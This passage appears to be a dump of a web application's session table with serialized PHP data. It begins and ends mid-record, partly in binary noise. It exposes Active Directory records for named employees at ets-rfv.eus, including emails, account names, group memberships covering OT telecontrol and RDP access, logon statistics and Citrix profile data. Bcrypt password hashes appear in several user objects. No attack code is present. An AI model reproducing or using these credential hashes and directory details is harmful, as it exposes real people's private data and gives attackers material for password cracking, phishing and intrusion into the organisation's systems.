4;8LГ+ү<5ҲҰ“XXц)v—ьЛUeя;s•,ӣпKң\"Чзуr=һ “ДKn№и\rnБt&А0ҷ;”ҳ№ЬoЎ\0АЕуэrСяғЬ„^ZҺXRҚР]_Ю\"№РЧгuҙxҜ‘ҝю7yЩҳГщ?„xӘН\00\r	*ҶHҶч\r\0Ӯ\0FңчҫюWkъҡэЦТңЈӘMф1іц ҲйҡhӮнҰКт<wғjCО4Ҡф8\0RҒNYhXя“=ңҶ8МoР$вЫҗIIҢ§HУ АCP№o|ҢаЮ–U¶¶ЧLьиФбЖwoСҸ’ҲнжveZbPqӘғ_яч9ВЪV^ҺжҲlҚһ4(,gғс>и\0ҮM5)JҪЫ6aЦpШaЭҝIO»яЪХ”Ы	ҡҫҰ{\rҹЎщиё*јqCЖӣ4C1мЪM…k7Ҹ_]`¬ӘұҰҙY®зӮнrҒ”ӢЖЎұҡ29аsӨег!fЖф©©Е!YКFюУо,ovBқ\"Kј¶у\'йr\";}i:33;s:20:\"msmqsigncertificates\";s:11:\"msmqdigests\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"ҝҪ”м*Ҙтjҝm7иSәЛә\";}i:34;s:11:\"msmqdigests\";s:21:\"dscorepropagationdata\";a:6:{s:5:\"count\";i:5;i:0;s:17:\"20240116092757.0Z\";i:1;s:17:\"20231221074121.0Z\";i:2;s:17:\"20230112143756.0Z\";i:3;s:17:\"20221007114627.0Z\";i:4;s:17:\"16010101000000.0Z\";}i:35;s:21:\"dscorepropagationdata\";s:18:\"lastlogontimestamp\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134216808007598145\";}i:36;s:18:\"lastlogontimestamp\";s:22:\"msds-authenticatedatdc\";a:2:{s:5:\"count\";i:1;i:0;s:51:\"CN=D-SERV-DOM,OU=Domain Controllers,DC=ets,DC=local\";}i:37;s:22:\"msds-authenticatedatdc\";s:39:\"msds-lastsuccessfulinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134225383481220154\";}i:38;s:39:\"msds-lastsuccessfulinteractivelogontime\";s:35:\"msds-lastfailedinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134219172153647616\";}i:39;s:35:\"msds-lastfailedinteractivelogontime\";s:32:\"msds-failedinteractivelogoncount\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"183\";}i:40;s:32:\"msds-failedinteractivelogoncount\";s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"183\";}i:41;s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";s:14:\"mstsexpiredate\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260411110822.0Z\";}i:42;s:14:\"mstsexpiredate\";s:18:\"mstslicenseversion\";a:2:{s:5:\"count\";i:1;i:0;s:6:\"655361\";}i:43;s:18:\"mstslicenseversion\";s:14:\"mstsmanagingls\";a:2:{s:5:\"count\";i:1;i:0;s:23:\"00429-00000-77480-AT645\";}i:44;s:14:\"mstsmanagingls\";s:19:\"mstslicenseversion2\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"7\";}i:45;s:19:\"mstslicenseversion2\";s:19:\"mstslicenseversion3\";a:2:{s:5:\"count\";i:1;i:0;s:11:\"C50-10.01-S\";}i:46;s:19:\"mstslicenseversion3\";s:5:\"count\";i:47;s:2:\"dn\";s:77:\"CN=Administrador Erlantz Roman,OU=administradores,OU=Sistemak,DC=ets,DC=local\";}}Flash|a:1:{s:5:\"flash\";a:1:{i:0;a:4:{s:7:\"message\";s:129:\"El usuario Administrador Erlantz Roman serГЎ dado de alta en el sistema por el Administrador, se enviara notificacion al correo: \";s:3:\"key\";s:5:\"flash\";s:7:\"element\";s:12:\"Flash/delete\";s:6:\"params\";a:0:{}}}}',1778097715),('2rpavc7h3hu0sta7u93icrtr25','2026-05-06 11:54:52','Config|a:1:{s:4:\"time\";i:1778068492;}',1778097292),('3o55736uak8npd56fstq8413rq','2026-05-09 14:50:30','Config|a:1:{s:4:\"time\";i:1778338252;}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:1:\"1\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:163;s:8:\"username\";s:7:\"gomagun\";s:10:\"firts_name\";s:29:\"Gorka Magunazelaia  Zuburruti\";s:9:\"last_name\";N;s:8:\"password\";s:60:\"$2y$10$UtTMSrNxI5LLAkYk2IwCBufbBnmjGKHhQV7X1ZTIg7AFcMU2pYY5i\";s:5:\"email\";s:25:\"gmagunazelaia@ets-rfv.eus\";s:7:\"role_id\";i:2;s:13:\"codigo_agente\";i:508;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2025-10-14 09:14:42.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2025-10-14 10:55:53.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:156:\"CN-Gorka-Magunazelaia-Zuburruti-OU-Operador-y-tecnico-de-red-Nasalb01-OU-Estaciones-CTX6-Netalb01-OU-Explotacion-OU-Usuarios-ETS-OU-Usuarios-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}',1778367052),('6gsgl4aamc4iosprcar4fr1g0f','2026-05-06 11:53:16','Config|a:1:{s:4:\"time\";i:1778068402;}Flash|a:0:{}user_ldap|b:0;',1778097206),('6vbr70ok01bk761dvnic89mo5r','2026-05-02 23:59:08','Config|a:1:{s:4:\"time\";i:1777766348;}',1777795148),('7kaomviljjahpus002m3oc4r4g','2026-05-04 12:44:14','Config|a:1:{s:4:\"time\";i:1777898767;}Flash|a:0:{}user_ldap|a:2:{s:5:\"count\";i:1;i:0;a:84:{s:11:\"objectclass\";a:5:{s:5:\"count\";i:4;i:0;s:3:\"top\";i:1;s:6:\"person\";i:2;s:20:\"organizationalPerson\";i:3;s:4:\"user\";}i:0;s:11:\"objectclass\";s:2:\"cn\";a:2:{s:5:\"count\";i:1;i:0;s:33:\"Harritokieta TroitiГұo Berasategi\";}i:1;s:2:\"cn\";s:2:\"sn\";a:2:{s:5:\"count\";i:1;i:0;s:20:\"TroitiГұo Berasategi\";}i:2;s:2:\"sn\";s:11:\"description\";a:2:{s:5:\"count\";i:1;i:0;s:25:\"TГ©cnico de red Puro 2026\";}i:3;s:11:\"description\";s:10:\"postalcode\";a:2:{s:5:\"count\";i:1;i:0;s:4:\"okta\";}i:4;s:10:\"postalcode\";s:9:\"givenname\";a:2:{s:5:\"count\";i:1;i:0;s:12:\"Harritokieta\";}i:5;s:9:\"givenname\";s:17:\"distinguishedname\";a:2:{s:5:\"count\";i:1;i:0;s:123:\"CN=Harritokieta TroitiГұo Berasategi,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:6;s:17:\"distinguishedname\";s:12:\"instancetype\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"4\";}i:7;s:12:\"instancetype\";s:11:\"whencreated\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20251217112905.0Z\";}i:8;s:11:\"whencreated\";s:11:\"whenchanged\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260504123529.0Z\";}i:9;s:11:\"whenchanged\";s:11:\"displayname\";a:2:{s:5:\"count\";i:1;i:0;s:33:\"Harritokieta TroitiГұo Berasategi\";}i:10;s:11:\"displayname\";s:10:\"usncreated\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"353708306\";}i:11;s:10:\"usncreated\";s:8:\"memberof\";a:12:{s:5:\"count\";i:11;i:0;s:81:\"CN=gr_mdm_teams,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:1;s:78:\"CN=gr_okta_hyland_pro,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:2;s:73:\"CN=gr_GIE2023,OU=GIE2023,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:3;s:71:\"CN=gr_onbase,OU=ONBASE,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:4;s:88:\"CN=gr_mdm_perfil_tred2,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:5;s:96:\"CN=gr_carpeta_explotacion,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:6;s:103:\"CN=gr_ctx_perfil,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:7;s:108:\"CN=gr_ctx_tecnicosred,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:8;s:122:\"CN=gr_int_pertsona_lectura,OU=Pertsona_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:9;s:107:\"CN=gr_ctx_estaciones,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:10;s:68:\"CN=gr_ETS,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:12;s:8:\"memberof\";s:10:\"usnchanged\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"355033028\";}i:13;s:10:\"usnchanged\";s:4:\"name\";a:2:{s:5:\"count\";i:1;i:0;s:33:\"Harritokieta TroitiГұo Berasategi\";}i:14;s:4:\"name\";s:10:\"objectguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"і·/Ғ№w:@ ь-ҝw\";}i:15;s:10:\"objectguid\";s:18:\"useraccountcontrol\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"512\";}i:16;s:18:\"useraccountcontrol\";s:11:\"badpwdcount\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:17;s:11:\"badpwdcount\";s:8:\"codepage\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:18;s:8:\"codepage\";s:11:\"countrycode\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:19;s:11:\"countrycode\";s:15:\"badpasswordtime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134222374117131287\";}i:20;s:15:\"badpasswordtime\";s:10:\"lastlogoff\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:21;s:10:\"lastlogoff\";s:9:\"lastlogon\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134223717293352771\";}i:22;s:9:\"lastlogon\";s:10:\"pwdlastset\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134222281201220572\";}i:23;s:10:\"pwdlastset\";s:14:\"primarygroupid\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"513\";}i:24;s:14:\"primarygroupid\";s:14:\"userparameters\";a:2:{s:5:\"count\";i:1;i:0;s:402:\"                                                P\ZCtxCfgPresentг”өж”ұжҲ°гҒўCtxCfgFlags1гҖ°гҒҰгҖІгҖ№CtxShadowг„°гҖ°гҖ°гҖ°*CtxMinEncryptionLevelг„° .CtxWFProfilePathжҢөжҢөгҢ¶гӨ¶гҳ¶гҢ·жҢөгҢ¶гӨ¶гҗ·гҲ·гӨ¶г ·гҗІжҢөг ¶г„¶гҗ·гҲ·жҳ¶гӨ¶гҗ·гҖ°\"\\CtxWFProfilePathWжҢөгҖ°жҢөгҖ°гҢ¶гҖ°гӨ¶гҖ°гҳ¶гҖ°гҢ·гҖ°жҢөгҖ°гҢ¶гҖ°гӨ¶гҖ°гҗ·гҖ°гҲ·гҖ°гӨ¶гҖ°г ·гҖ°гҗІгҖ°жҢөгҖ°г ¶гҖ°г„¶гҖ°гҗ·гҖ°гҲ·гҖ°жҳ¶гҖ°гӨ¶гҖ°гҗ·гҖ°гҖ°гҖ°\";}i:25;s:14:\"userparameters\";s:9:\"objectsid\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"\0\0\0\0\0\0\0\0ХЛ\\XЎфbе;+9\0\0\";}i:26;s:9:\"objectsid\";s:14:\"accountexpires\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"9223372036854775807\";}i:27;s:14:\"accountexpires\";s:10:\"logoncount\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"217\";}i:28;s:10:\"logoncount\";s:14:\"samaccountname\";a:2:{s:5:\"count\";i:1;i:0;s:7:\"hatroit\";}i:29;s:14:\"samaccountname\";s:14:\"samaccounttype\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"805306368\";}i:30;s:14:\"samaccounttype\";s:17:\"userprincipalname\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"hatroit@ets-rfv.eus\";}i:31;s:17:\"userprincipalname\";s:14:\"objectcategory\";a:2:{s:5:\"count\";i:1;i:0;s:52:\"CN=Person,CN=Schema,CN=Configuration,DC=ets,DC=local\";}i:32;s:14:\"objectcategory\";s:21:\"dscorepropagationdata\";a:3:{s:5:\"count\";i:2;i:0;s:17:\"20260317125144.0Z\";i:1;s:17:\"16010101000000.0Z\";}i:33;s:21:\"dscorepropagationdata\";s:21:\"ms-ds-consistencyguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"і·/Ғ№w:@ ь-ҝw\";}i:34;s:21:\"ms-ds-consistencyguid\";s:18:\"lastlogontimestamp\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134217118121469923\";}i:35;s:18:\"lastlogontimestamp\";s:39:\"msds-lastsuccessfulinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134223717293352771\";}i:36;s:39:\"msds-lastsuccessfulinteractivelogontime\";s:35:\"msds-lastfailedinteractivelogontime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134222374117048840\";}i:37;s:35:\"msds-lastfailedinteractivelogontime\";s:32:\"msds-failedinteractivelogoncount\";a:2:{s:5:\"count\";i:1;i:0;s:2:\"11\";}i:38;s:32:\"msds-failedinteractivelogoncount\";s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";a:2:{s:5:\"count\";i:1;i:0;s:2:\"11\";}i:39;s:53:\"msds-failedinteractivelogoncountatlastsuccessfullogon\";s:4:\"mail\";a:2:{s:5:\"count\";i:1;i:0;s:21:\"htroitino@ets-rfv.eus\";}i:40;s:4:\"mail\";s:5:\"count\";i:41;s:2:\"dn\";s:123:\"CN=Harritokieta TroitiГұo Berasategi,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:1:\"1\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:174;s:8:\"username\";s:7:\"hatroit\";s:10:\"firts_name\";s:33:\"Harritokieta TroitiГұo Berasategi\";s:9:\"last_name\";N;s:8:\"password\";s:60:\"$2y$10$Sn3igWw3bM9fS.uuQc7TeOpfWtVJ62.2nKG5EWVyjup1TmFbcJZRm\";s:5:\"email\";s:21:\"htroitino@ets-rfv.eus\";s:7:\"role_id\";i:2;s:13:\"codigo_agente\";i:518;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2026-05-02 23:21:09.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2026-05-04 05:19:19.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:122:\"CN-Harritokieta-Troitino-Berasategi-OU-Estaciones-CTX6-Netalb01-OU-Explotacion-OU-Usuarios-ETS-OU-Usuarios-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}',1777927567),('a4npe417isgq82cposq2b4n5vl','2026-05-09 22:41:21','Config|a:1:{s:4:\"time\";i:1778366511;}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:1:\"1\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:32;s:8:\"username\";s:7:\"esrodri\";s:10:\"firts_name\";s:37:\"Estibaliz Rodrigalvarez Urrutikoetxea\";s:9:\"last_name\";s:0:\"\";s:8:\"password\";s:60:\"$2y$10$HpCyhpORBfSIiTeyzBCesuY9AIA.jytNMT4b6PoLeukCOtJfySUBC\";s:5:\"email\";s:26:\"ERODRIGALVAREZ@ETS-RFV.EUS\";s:7:\"role_id\";i:2;s:13:\"codigo_agente\";i:292;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2019-05-08 12:58:52.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2019-05-09 09:55:33.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:131:\"CN-Estibaliz-Rodrigalvarez-Urrutikoetxea-OU-OperadorInspector-OU-PMAmara-OU-Explotacion-OU-Usuarios-ETS-OU-Usuarios-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}Flash|a:0:{}',1778395311),('ac4agvmmte7acvqculv84a4qtn','2026-05-08 20:05:32','Config|a:1:{s:4:\"time\";i:1778270732;}Preferences|a:3:{s:6:\"IDIOMA\";s:5:\"es_ES\";s:15:\"PUESTOS_GESTION\";s:1:\"1\";s:4:\"skin\";s:9:\"skin-blue\";}Auth|a:1:{s:4:\"User\";O:21:\"App\\Model\\Entity\\User\":11:{s:14:\"\0*\0_accessible\";a:2:{s:1:\"*\";b:1;s:2:\"id\";b:0;}s:10:\"\0*\0_hidden\";a:1:{i:0;s:8:\"password\";}s:14:\"\0*\0_properties\";a:12:{s:2:\"id\";i:157;s:8:\"username\";s:7:\"aipetri\";s:10:\"firts_name\";s:26:\"Aitor Petrikorena Arbelaiz\";s:9:\"last_name\";N;s:8:\"password\";s:60:\"$2y$10$.pLj3UTCtBBaV2yqpYDdBeJjBphWsNmwSZ45867sXg75jqJXY.B/W\";s:5:\"email\";s:24:\"apetrikorena@ets-rfv.eus\";s:7:\"role_id\";i:2;s:13:\"codigo_agente\";i:499;s:14:\"notificaciones\";i:1;s:7:\"created\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2025-02-18 10:01:47.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:8:\"modified\";O:20:\"Cake\\I18n\\FrozenTime\":3:{s:4:\"date\";s:26:\"2025-02-18 10:06:00.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:2:\"dn\";s:154:\"CN-Aitor-Petrikorena-Arbelaiz-OU-Operador-y-tecnico-de-red-Nasalb01-OU-Estaciones-CTX6-Netalb01-OU-Explotacion-OU-Usuarios-ETS-OU-Usuarios-DC-ets-DC-local\";}s:12:\"\0*\0_original\";a:0:{}s:11:\"\0*\0_virtual\";a:0:{}s:13:\"\0*\0_className\";N;s:9:\"\0*\0_dirty\";a:1:{s:2:\"dn\";b:1;}s:7:\"\0*\0_new\";b:0;s:10:\"\0*\0_errors\";a:0:{}s:11:\"\0*\0_invalid\";a:0:{}s:17:\"\0*\0_registryAlias\";s:5:\"Users\";}}',1778299532),('ar8q89o2n643tt6egarfefk3fp','2026-05-06 08:49:21','Config|a:1:{s:4:\"time\";i:1778057406;}user_ldap|a:2:{s:5:\"count\";i:1;i:0;a:96:{s:11:\"objectclass\";a:5:{s:5:\"count\";i:4;i:0;s:3:\"top\";i:1;s:6:\"person\";i:2;s:20:\"organizationalPerson\";i:3;s:4:\"user\";}i:0;s:11:\"objectclass\";s:2:\"cn\";a:2:{s:5:\"count\";i:1;i:0;s:21:\"Aitor Canibe Villamor\";}i:1;s:2:\"cn\";s:2:\"sn\";a:2:{s:5:\"count\";i:1;i:0;s:15:\"Canibe Villamor\";}i:2;s:2:\"sn\";s:11:\"description\";a:2:{s:5:\"count\";i:1;i:0;s:29:\"Plantilla ETS. Jefe PM Atxuri\";}i:3;s:11:\"description\";s:10:\"postalcode\";a:2:{s:5:\"count\";i:1;i:0;s:4:\"okta\";}i:4;s:10:\"postalcode\";s:9:\"givenname\";a:2:{s:5:\"count\";i:1;i:0;s:5:\"Aitor\";}i:5;s:9:\"givenname\";s:17:\"distinguishedname\";a:2:{s:5:\"count\";i:1;i:0;s:95:\"CN=Aitor Canibe Villamor,OU=PMAtxuri,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:6;s:17:\"distinguishedname\";s:12:\"instancetype\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"4\";}i:7;s:12:\"instancetype\";s:11:\"whencreated\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20190401102317.0Z\";}i:8;s:11:\"whencreated\";s:11:\"whenchanged\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260506080209.0Z\";}i:9;s:11:\"whenchanged\";s:11:\"displayname\";a:2:{s:5:\"count\";i:1;i:0;s:21:\"Aitor Canibe Villamor\";}i:10;s:11:\"displayname\";s:10:\"usncreated\";a:2:{s:5:\"count\";i:1;i:0;s:5:\"22812\";}i:11;s:10:\"usncreated\";s:8:\"memberof\";a:35:{s:5:\"count\";i:34;i:0;s:123:\"CN=gr_Usuarios_GP_PA_Portatiles,OU=GLOBALPROTECT,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:1;s:81:\"CN=gr_mdm_teams,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:2;s:77:\"CN=gr_okta_GP_PA_pro,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:3;s:78:\"CN=gr_okta_hyland_pro,OU=OKTA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:4;s:80:\"CN=gr_AGS_Supervisor,OU=AGS_GMV,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:5;s:73:\"CN=gr_GIE2023,OU=GIE2023,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:6;s:102:\"CN=gr_Ripublic_Reinicio_Servidores,OU=Ripublic,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:7;s:99:\"CN=gr_Ripublic_Telein_NetOP_RDP,OU=Ripublic,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:8;s:135:\"CN=gr_intranet2023_vehiculos_consumo_lectura,OU=Intranet2023,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:9;s:115:\"CN=gr_trena_aurkitu_pre,OU=trena_aurkitu,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:10;s:125:\"CN=gr_intranet2023_MantOpe_lectura,OU=Intranet2023,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:11;s:104:\"CN=gr_tele_est_Supervisor,OU=TelemandoEstaciones,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:12;s:75:\"CN=gr_users_traka,OU=TRAKA,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:13;s:95:\"CN=gr_tele_ene_Mant,OU=TelemandoEnergia,OU=GruposAcceso,OU=AplicacionesOT,OU=OT,DC=ets,DC=local\";i:14;s:84:\"CN=gr_mdm_euskoags,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:15;s:109:\"CN=gr_datosRED_Estaciones_interactivas,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:16;s:71:\"CN=gr_onbase,OU=ONBASE,OU=UsuariosDeSistema,OU=Sistemak,DC=ets,DC=local\";i:17;s:152:\"CN=gr_intranet_kontratazioak_UsuariosPIC,OU=ver2021,OU=Kontratazioak_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:18;s:132:\"CN=gr_datosRed_Circulacion_DepCirculacion_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:19;s:91:\"CN=gr_mdm_app_PersonalGes,OU=MDM,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:20;s:127:\"CN=gr_datosRed_Circulacion_logistica_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:21;s:96:\"CN=gr_carpeta_explotacion,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:22;s:120:\"CN=gr_datos_red_Priv_Dir_expl_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:23;s:104:\"CN=gr_ctx_jefesPM,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:24;s:117:\"CN=Gr_datos_red_PM_General_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:25;s:122:\"CN=gr_int_pertsona_lectura,OU=Pertsona_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:26;s:141:\"CN=gr_intranet_kontratazioak_circulacion,OU=Kontratazioak_intranet,OU=Aplicaciones,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:27;s:84:\"CN=gr_PMAtxuriSinOperador,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:28;s:128:\"CN=gr_datos_red_priv_coordinadora_red_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:29;s:80:\"CN=gr_mie_user,OU=MIE,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:30;s:84:\"CN=gr_PMAmara_SinOperador,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:31;s:126:\"CN=gr_datos_red_priv_vigilancia_red_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:32;s:136:\"CN=gr_datosred_priv_circulacion_SisInfPublico_escritura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:33;s:68:\"CN=gr_ETS,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";}i:12;s:8:\"memberof\";s:10:\"usnchanged\";a:2:{s:5:\"count\";i:1;i:0;s:8:\"36748573\";}i:13;s:10:\"usnchanged\";s:4:\"name\";a:2:{s:5:\"count\";i:1;i:0;s:21:\"Aitor Canibe 